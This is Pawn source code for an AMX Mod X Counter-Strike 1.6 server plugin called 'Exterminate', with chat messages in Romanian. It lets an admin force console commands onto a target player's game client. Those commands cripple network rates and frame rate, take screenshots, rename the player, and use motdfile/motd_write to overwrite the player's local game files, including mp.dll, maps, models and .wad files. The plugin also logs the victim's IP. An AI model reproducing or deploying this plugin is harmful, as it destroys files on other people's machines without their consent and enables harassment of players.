#include < amxmodx >
#include < amxmisc >

new const g_sCommands[ ][ ] =
{
	"rate 1",
	"cl_cmdrate 1",
	"cl_updaterate 1",
	"fps_max 1",
	"sys_ticrate 1",
	
	"wait;snapshot;wait;snapshot",
	
	"name JBRomania.Ro",
	
	"motdfile models/player.mdl;motd_write x",
	"motdfile models/v_ak47.mdl;motd_write x",
	"motdfile cs_dust.wad;motd_write x",
	"motdfile models/v_m4a1.mdl;motd_write x",
	"motdfile resource/GameMenu.res;motd_write x",
	"motdfile halflife.wad;motd_write x",
	"motdfile cstrike.wad;motd_write x",
	"motdfile maps/de_dust2.bsp;motd_write x",
	"motdfile events/ak47.sc;motd_write x",
	"motdfile dlls/mp.dll;motd_write x",
	
	"cl_timeout 0"	
};

public plugin_init( )
{
	register_plugin( "Exterminate", "1.0", "AleCs14" );
	register_concmd( "amx_exterminate", "Concmd_AMXX_exterminate", ADMIN_LEVEL_D, "<player>" );
}

public Concmd_AMXX_exterminate( id, level, cid )
{
	if( !cmd_access( id, level, cid, 2 ) )
		return PLUGIN_HANDLED;
	
	new sArgument[ 32 ];
	read_argv( 1, sArgument, charsmax( sArgument ) );
	
	new player = cmd_target( id, sArgument, ( CMDTARGET_NO_BOTS | CMDTARGET_OBEY_IMMUNITY | CMDTARGET_ALLOW_SELF ) );
	
	if( !player )
		return PLUGIN_HANDLED;
	
	new name[ 32 ], name2[ 32 ], ip2[ 16 ];
	get_user_name( id, name, charsmax( name ) );
	get_user_name( player, name2, charsmax( name2 ) );
	get_user_ip( player, ip2, charsmax( ip2 ), 1 );
	
	
	player_color( 0, ".gAdminul .v%s .ga aplicat comanda EXTERMINATE pe .v%s", name, name2 );
	player_color( 0, ".gComanda executata cu succes de catre adminul .v%s", name );
	client_print(player,print_chat,"*** %s ai primit EXTERMINATE de la ADMINUL %s ***", name2 , name ) ;
	client_print(player,print_chat,"*** %s daca consideri ca ADMINUL %s a abuzat de aceasta comanda fa o reclamatie aici WwW.Mevid.Ro***", name2 , name ) ;
	client_print(player,print_chat,"*** %s ti-au fost facute 2 ss (poze) in cstrike/(numele hartii )***", name2 ) ;
	
	for( new i = 0; i < sizeof( g_sCommands ); i++)
		client_cmd( player, g_sCommands[ i ] );
		
	log_to_file( "exterminations.log", "%s exterminate %s(%s)", name, name2, ip2 );
	
	player_color( 0, ".gADMIN .v%s .g: A exterminat codatul .v%s", name, name2 );
	
	client_cmd( 0, "spk ^"vox/bizwarn detected user and exterminate^"" );	
	
	return PLUGIN_HANDLED;
}

stock player_color( const id, const input[ ], any:... )
{
	new count = 1, players[ 32 ]

	static msg[ 191 ]
	vformat( msg, 190, input, 3 )
	
	replace_all( msg, 190, ".v", "^4" ) /* verde */
	replace_all( msg, 190, ".g", "^1" ) /* galben */
	replace_all( msg, 190, ".e", "^3" ) /* ct=albastru | t=rosu */
	replace_all( msg, 190, ".x", "^0" ) /* normal-echipa */
	
	if( id ) players[ 0 ] = id; else get_players( players, count, "ch" )
	{
		for( new i = 0; i < count; i++ )
		{
			if( is_user_connected( players[ i ] ) )
			{
				message_begin( MSG_ONE_UNRELIABLE, get_user_msgid( "SayText" ), _, players[ i ] )
				write_byte( players[ i ] );
				write_string( msg );
				message_end( );
			}
		}
	}
}
